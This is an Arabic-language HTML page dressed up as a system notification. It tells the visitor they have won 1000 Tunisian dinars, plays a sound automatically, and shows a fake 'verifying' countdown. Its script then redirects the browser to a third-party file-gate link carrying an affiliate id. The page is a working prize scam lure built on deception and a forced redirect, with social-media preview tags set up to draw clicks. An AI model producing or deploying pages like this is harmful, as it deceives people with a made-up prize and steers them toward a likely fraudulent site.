<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>إشعار النظام - جائزة 1000 دينار</title>
  <meta property="og:title" content="إشعار النظام: ربحت 1000 دينار!" />
  <meta property="og:description" content="اضغط الآن لتأكيد واستلام الجائزة." />
  <meta property="og:image" content="https://i.imgur.com/3JQ6Z4N.png" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f4f4f4;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .notification {
      background-color: #ffffff;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      border-radius: 12px;
      padding: 20px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
    .notification h2 {
      font-size: 22px;
      margin-bottom: 10px;
      color: #388e3c;
    }
    .notification p {
      font-size: 16px;
      color: #333;
    }
    .countdown {
      font-weight: bold;
      color: #d32f2f;
      margin: 15px 0;
    }
    .btn {
      display: inline-block;
      background-color: #1976d2;
      color: white;
      padding: 12px 25px;
      font-size: 16px;
      border-radius: 8px;
      text-decoration: none;
      margin-top: 15px;
    }
    .btn:hover {
      background-color: #1565c0;
    }
  </style>
</head>
<body>
  <div class="notification">
    <h2>📱 إشعار النظام</h2>
    <p>🎉 مبروك! لقد ربحت <strong>1000 دينار تونسي</strong>!</p>
    <p class="countdown" id="countdown">جارٍ التحقق... 5</p>
    <a class="btn" href="https://singingfiles.com/show.php?l=0&u=2395961&id=54791">استلام الجائزة الآن</a>
  </div>

  <audio autoplay>
    <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_f56b9f61f5.mp3?filename=notification-132141.mp3" type="audio/mp3">
  </audio>

  <script>
    let seconds = 5;
    const countdown = document.getElementById('countdown');
    const url = "https://singingfiles.com/show.php?l=0&u=2395961&id=54791";

    const timer = setInterval(() => {
      seconds--;
      countdown.textContent = `جارٍ التحقق... ${seconds}`;
      if (seconds <= 0) {
        clearInterval(timer);
        window.location.href = url;
      }
    }, 1000);
  </script>
</body>
</html>
